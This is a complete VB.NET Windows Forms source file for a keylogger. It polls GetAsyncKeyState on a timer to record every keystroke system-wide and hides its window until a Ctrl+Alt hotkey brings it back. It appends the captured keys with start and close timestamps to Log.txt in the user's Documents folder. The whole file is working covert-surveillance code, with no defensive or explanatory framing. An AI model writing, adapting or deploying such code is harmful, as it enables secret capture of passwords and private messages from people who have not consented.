Option Strict On
Imports System.IO
Public Class Form1
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vkey As Int32) As Int16


    Private Sub keytimer_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles keytimer.Tick
        Dim result As Integer
        Dim key As String
        key = Nothing
        Dim i As Integer
        For i = 2 To 220
            result = 0
            result = GetAsyncKeyState(i)
            If result = -32767 Then
                key = Chr(i)
                If i = 13 Then key = vbNewLine
                If i = 17 Then key = "-Ctrl-"
                If i = 18 Then key = "-Alt-"
                If i = 16 Then key = "-Shift-"
                If i = 27 Then key = "-Esc-"
                If i = 8 Then key = "‹"

                If i = 91 Then key = "-WinKy-"
                If i = 92 Then key = "-WinKy-"

                If i = 96 Then key = "0"
                If i = 97 Then key = "1"
                If i = 98 Then key = "2"
                If i = 99 Then key = "3"
                If i = 100 Then key = "4"
                If i = 101 Then key = "5"
                If i = 102 Then key = "6"
                If i = 103 Then key = "7"
                If i = 104 Then key = "8"
                If i = 105 Then key = "9"

                If i = 106 Then key = "*"
                If i = 107 Then key = "+"
                If i = 109 Then key = "-"
                If i = 110 Then key = "."
                If i = 111 Then key = "/"

                If i = 187 Then key = "="
                If i = 188 Then key = ","
                If i = 189 Then key = "-"
                If i = 190 Then key = "."
                If i = 191 Then key = "/"
                If i = 220 Then key = "\"


                Exit For
            End If
        Next i

        If key <> Nothing Then
            If My.Computer.Keyboard.ShiftKeyDown OrElse My.Computer.Keyboard.CapsLock Then
                keylog.Text &= key
            Else
                keylog.Text &= key.ToLower
            End If
        End If

        If My.Computer.Keyboard.CtrlKeyDown AndAlso My.Computer.Keyboard.AltKeyDown AndAlso i = 90 Then
            Me.Show()
        End If

    End Sub

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Me.Hide()
    End Sub

    Private Sub savetimer_Tick() Handles savetimer.Tick
        Try
            My.Computer.FileSystem.WriteAllText(My.Computer.FileSystem.SpecialDirectories.MyDocuments + "\Log.txt", keylog.Text, True)
            keylog.Clear()

        Catch ex As Exception

        End Try
    End Sub

    Private Sub Form1_FormClosed(ByVal sender As Object, ByVal e As System.Windows.Forms.FormClosedEventArgs) Handles Me.FormClosed
        keylog.Text &= vbNewLine & "Closed at: " & Now & vbNewLine
        savetimer_Tick()
    End Sub

    Private Sub Form1_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        keylog.Text = "Started at: " & Now & vbNewLine
    End Sub

    
End Class
